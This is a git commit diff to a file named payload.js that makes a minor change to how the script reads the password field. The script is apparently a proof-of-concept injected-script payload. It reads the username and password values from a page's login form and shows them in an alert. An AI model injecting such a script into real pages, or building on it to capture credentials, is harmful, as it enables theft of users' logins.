dc4cc16c9cf63a3eef63b77430d337d66ef56019
Jok3r <115065483+Vault-of-Jok3r@users.noreply.github.com>
2025-03-10 14:17:25 +0100

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,5 +1,5 @@
 (function() {
   var user = document.getElementById('username')?.value || '';
-  var pass = document.getElementById('password')?.value || '';
+  var pass = document.getElementById('password').value || '';
   alert('Username: ' + user + '\nPassword: ' + pass);
 })();
